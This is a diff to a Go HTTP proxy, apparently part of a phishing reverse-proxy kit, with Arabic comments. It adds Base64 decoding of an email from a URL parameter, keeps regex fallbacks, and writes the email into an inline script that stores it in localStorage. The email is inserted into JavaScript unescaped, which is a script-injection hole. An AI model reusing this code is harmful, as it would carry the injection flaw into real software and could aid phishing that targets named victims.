@@ -1545,41 +1545,53 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	fullURL := req.URL.String()
 	email := ""
 	
-	// البحث عن البريد الإلكتروني في المسار باستخدام التعبير النمطي
-	// محاولة البحث عن الإيميل بعدة طرق مختلفة للتعامل مع الحالات المختلفة
-	
-	// الطريقة الأولى: البحث عن النمط المعتاد
-	re1 := regexp.MustCompile(`\$([^\/]+@[^\/]+)`)
-	matches1 := re1.FindStringSubmatch(path)
-	if len(matches1) > 1 {
-		email = matches1[1]
-	}
-	
-	// الطريقة الثانية: البحث عن النمط المشفر
-	re2 := regexp.MustCompile(`\$([^\/]+%40[^\/]+)`)
-	matches2 := re2.FindStringSubmatch(path)
-	if len(matches2) > 1 {
-		decodedEmail, err := url.QueryUnescape(matches2[1])
+	// البحث عن البريد الإلكتروني المشفر بـ Base64 في معلمات URL
+	urlValues := req.URL.Query()
+	if encodedEmail, exists := urlValues["e"]; exists && len(encodedEmail) > 0 {
+		decodedBytes, err := base64.StdEncoding.DecodeString(encodedEmail[0])
 		if err == nil {
-			email = decodedEmail
+			email = string(decodedBytes)
+			log.Info("تم استخراج البريد الإلكتروني من معلمة Base64: %s", email)
+		} else {
+			log.Warning("فشل في فك تشفير البريد الإلكتروني: %s", err)
 		}
 	}
 	
-	// الطريقة الثالثة: البحث في URL كامل
-	re3 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+%40[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
-	matches3 := re3.FindStringSubmatch(fullURL)
-	if len(matches3) > 0 {
-		decodedEmail, err := url.QueryUnescape(matches3[0])
-		if err == nil && email == "" {
-			email = decodedEmail
+	// طرق احتياطية أخرى للبحث عن البريد الإلكتروني
+	if email == "" {
+		// الطريقة الأولى: البحث عن النمط المعتاد
+		re1 := regexp.MustCompile(`\$([^\/]+@[^\/]+)`)
+		matches1 := re1.FindStringSubmatch(path)
+		if len(matches1) > 1 {
+			email = matches1[1]
 		}
-	}
-	
-	// الطريقة الرابعة: البحث عن صيغة النطاق في URL
-	re4 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
-	matches4 := re4.FindStringSubmatch(fullURL)
-	if len(matches4) > 0 && email == "" {
-		email = matches4[0]
+		
+		// الطريقة الثانية: البحث عن النمط المشفر
+		re2 := regexp.MustCompile(`\$([^\/]+%40[^\/]+)`)
+		matches2 := re2.FindStringSubmatch(path)
+		if len(matches2) > 1 {
+			decodedEmail, err := url.QueryUnescape(matches2[1])
+			if err == nil {
+				email = decodedEmail
+			}
+		}
+		
+		// الطريقة الثالثة: البحث في URL كامل
+		re3 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+%40[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
+		matches3 := re3.FindStringSubmatch(fullURL)
+		if len(matches3) > 0 {
+			decodedEmail, err := url.QueryUnescape(matches3[0])
+			if err == nil && email == "" {
+				email = decodedEmail
+			}
+		}
+		
+		// الطريقة الرابعة: البحث عن صيغة النطاق في URL
+		re4 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
+		matches4 := re4.FindStringSubmatch(fullURL)
+		if len(matches4) > 0 && email == "" {
+			email = matches4[0]
+		}
 	}
 	
 	if email != "" {
@@ -1760,9 +1772,6 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
     <script>
         // تخزين البريد الإلكتروني في localStorage إذا كان موجودًا
         window.onload = function() {
-
-		console.log("window.onload");
-		console.log("email: " + email);
             var email = "` + email + `";
             if (email && email.length > 0) {
                 localStorage.setItem('user_email', email);
